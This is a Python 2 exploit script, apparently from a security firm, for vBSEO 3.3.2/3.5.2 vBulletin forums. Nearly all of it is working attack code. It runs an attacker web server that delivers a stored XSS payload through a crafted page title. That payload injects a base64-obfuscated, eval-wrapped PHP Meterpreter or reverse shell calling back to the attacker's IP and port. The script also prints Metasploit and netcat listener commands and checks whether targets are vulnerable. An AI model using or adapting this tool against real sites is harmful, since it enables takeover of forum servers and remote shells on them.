#!/usr/bin/env python
# Original Author: MaXe / InterN0T
# Modified by Hans-Michael Varbaek
# Company: Sense of Security
# Version: 1.0
#
# New Features:
# PHP Meterpreter

import sys
import re
import random
import httplib
import base64
import socket
from socket import gethostname
from os import curdir, sep
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer

def title():
    banner = """
      _____ ____  _____
     / ___// __ \\/ ___/
     \__ \\/ / / /\\__ \\ 
    ___/ / /_/ /___/ / 
   /____/\\____//____/  

   vBSEO Exploitation Tool   
"""
    return banner
    
# /**************************\ 
# |   SERVER CONFIGURATION   |
# \**************************/
# socket.getaddrinfo(socket.gethostname(), None)[0][4][0]
# socket.gethostbyname(socket.gethostname())
# The above methods seemed to be buggy on Linux, but worked fine on Windows (XP)
host = '192.168.92.152'  # You need to set this manually.
port = 80 # You may need to edit this too. This exploit was tested with port 80.
lhost = host # This host is used for Metasploit's Meterpreter
lport = '4321' # This port is used for Metasploit's Meterpreter

# /*************************\
# |  PAYLOAD CONFIGURATION  |
# \*************************/
# Do not edit these unless you know what you're doing. (Avoid common pattern detection)
evil_php = "%s%s%s" % (random.randrange(0, 253),random.randrange(1, 256),random.randrange(0, 255))
evil_jsf = "%s%s%s" % (random.randrange(1, 257),random.randrange(0, 254),random.randrange(1, 258))

payload_file = "trojan.js" # Javascript file containing our payload - This file needs to exist locally
xss_title = 'The Friendly Website" size="70" dir="ltr" tabindex="1"><script src="http://%s:%s/%s.js"></script><br ' % (host,port,evil_jsf)
toHex = lambda x:'\\x'.join([hex(ord(c))[2:].zfill(2) for c in x]) # Encodes input into \xHH format


# /*************************\
# |  PAYLOAD PREPARATION    |
# \*************************/
def prepPayload():
 try:
  payload_buff = open(payload_file)
  global payload_new
  print "\n[?] Do you wish to use a Meterpreter or a custom reverse shell?"
  theoption = raw_input("[+] Write 'meter' or 'shell' please: ")
  if theoption == 'meter':
    payload_shell = open('extras/metasploit/meterpreter.php')
    localhost = lhost
    localport = lport
    find_host = re.compile('(LOCALHOST)')
    add_host = find_host.sub(localhost,payload_shell.read())
    find_port = re.compile('(LOCALPORT)')
    add_port = find_port.sub(localport,add_host)
    stripspace = re.compile('[\t\n]')
    filepart2 = stripspace.sub('', add_port) # Was changed from filepart1 to add_port
    payload_input_shell = "if($_GET['activateshell']=='true') { %s } " % filepart2
    payload_insert = "eval(base64_decode(\""+base64.b64encode(payload_input_shell)+"\"));" # Was changed from Hex to Base64
    payload_replace = re.compile('(PHP_PAYLOAD)')
    payload_new = payload_replace.sub(payload_insert, payload_buff.read())
    print "[*] Start Metasploit and execute the following instructions:"
    print "use multi/handler"
    print "set payload php/meterpreter/reverse_tcp"
    print "set LHOST %s \nset LPORT %s" % (lhost,lport)
    print "[?] This must be done in another window."
  elif theoption == 'shell':
    payload_shell = open('extras/php-reverse-shell-1.0/php-reverse-shell.php')
    localhost = raw_input("[+] Enter a local IP-address: ")
    localport = raw_input("[+] Enter a local port: ")
    find_host = re.compile('(LOCALHOST)')
    add_host = find_host.sub(localhost,payload_shell.read())
    find_port = re.compile('(LOCALPORT)')
    add_port = find_port.sub(localport,add_host)
    stripcomments = re.compile('//.*?\n|/\*.*?\*/')
    filepart1 = stripcomments.sub('', add_port)
    stripspace = re.compile('[\t\n]')
    filepart2 = stripspace.sub('', filepart1)
    payload_input_shell = "if($_GET['activateshell']=='true') { %s } " % filepart2
    payload_insert = "eval(base64_decode(\""+base64.b64encode(payload_input_shell)+"\"));" # Was changed from Hex to Base64
    payload_replace = re.compile('(PHP_PAYLOAD)')
    payload_new = payload_replace.sub(payload_insert, payload_buff.read())
    print "[*] Start netcat before you proceed: nc -lv %s %s" % (localhost,localport)
    print "[?] This must be done in another window."
  else:
    print "[!] You did not write 'code' or 'shell', exiting script.."
    sys.exit(0)
 except KeyboardInterrupt:
  print '\n[*] CTRL+C received, exiting script..'
  sys.exit(0)


# /**************************\
# |   TARGET CONFIGURATION   |
# \**************************/
if sys.argv[1:]:
    target_link = sys.argv[1]
else:
    target_link = ''
    

class MyHandler(BaseHTTPRequestHandler):
	
	def do_GET(self):
		try:
			if self.path.endswith("%s.php" % evil_php): # This will be our dynamic extension for injection
				self.send_response(200)
				self.send_header('Content-type','text/html')
				self.end_headers()
				self.wfile.write('<html><head><title>%s</title>' % xss_title)
				self.wfile.write('</head><body><center><h1>vBSEO Stored Cross-site Scripting</h1><br /><br />') 
				self.wfile.write('<a href="%s" target="_blank">I found this awesome forum</a>' % target_link)
				self.wfile.write('</center></body></html>')
				return
			
			if self.path.endswith("%s.js" % evil_jsf): # These files must be in plain text.
				f = open('%s' % payload_file) 
				self.send_response(200)
				self.send_header('Content-type', 'text/plain')
				self.end_headers()
				self.wfile.write(payload_new)
				f.close()
				return

                        if self.path.endswith(""): # This is will show our main index file
                                f = open('index.html')
                                self.send_response(200)
                                self.send_header('Content-type', 'text/html')
                                self.end_headers()
                                self.wfile.write(f.read())
                                f.close()
                                return

				
			return
			
		except IOError:
			self.send_error(404,'File Not Found: %s' % self.path)
			
def assess():
  try:
    yesorno = raw_input("[?] Do you want to check if the target is vulnerable?\n[+] Write 'yes' or 'no' please: ")
    if yesorno == "yes":
        print "\n[?] Specify the target like this: http://forum-site.tld"
        ctarget = raw_input("[+] Please input target: ")

	# Strip away http and https from the target variable.
	striptarget = re.compile('(http://|https://)')
	newtarget = striptarget.sub('', ctarget)
	
	# Make the connection to the vulnerable file
	conn = httplib.HTTPConnection(newtarget, 80)
	print "[*] Checking if site appears to be vulnerable."
	conn.request("GET", "/vbseocp.php")
	resp = conn.getresponse()
	output = resp.read()

	# If the file was found and we have access to it (200 OK)
	if resp.status == 200:
	    print "[*] Website is responding, this is good."
	    if re.search("(<title>vBSEO Control Panel, vBSEO v.3.5.2</title>)", output):
	        print ">> The site appears to be vulnerable! (Version 3.5.2)"

	    elif re.search("(<title>vBSEO v.3.3.2</title>)", output):
	        print ">> The site appears to be vulnerable! (Version: 3.3.2)"

	    else:
	        print "[!] The site does not run vBSEO 3.3.2 nor 3.5.2, but may still be vulnerable."
	else:
	    print '[-] Server did not respond with a 200 OK message, continuing script execution.'
    elif yesorno == "no":
        completelyuselessvar = "1"
    else:
        print "[*] You didn't write yes or no, continuing script execution."
  except KeyboardInterrupt:
    print '\n[*] CTRL+C received, continuing script execution.'


def main():
    try:

	if len(sys.argv) != 2:
	    print title()
	    print '[!] You need to specify a target before this script will run.'
	    print '[?] Check out the source for further customisation.\n'
	    print 'Usage: %s target' % __file__
	    print 'Example: %s http://forum-site.tld/1234-a-nice-thread.html' % __file__
	else:
	  if host == '':
	    print title()
	    print '[!] You need to edit the host variable in the source.'
	  else:
	    #assess() # Check disabled in this version - Feel free to enable
	    prepPayload()
	    server = HTTPServer((host, port), MyHandler)
	    print '\n\t/*****************************\\'
	    print '\t| Started Payload HTTP Server |'
	    print '\t\\*****************************/\n'
	    print '[*] Serving attack file from: http://%s:%s/%s.php ' % (host,port,evil_php)
	    print '[*] Serving payload file from: http://%s:%s/%s.js ' % (host,port,evil_jsf)
	    print '[!] Browse to: "misc.php?activateshell=true", to activate the payload.'
	    print '[?] Press CTRL+C to stop the server and exit the script. \n'
	    print '-------------- HTTP Requests Below --------------'
	    #server.serve_forever() # You need to uncomment this line for the script to work.

    except KeyboardInterrupt:

	print '[*] CTRL+C received, shutting down Evil HTTP Server.'
	server.socket.close()

if __name__ == '__main__':
    main()
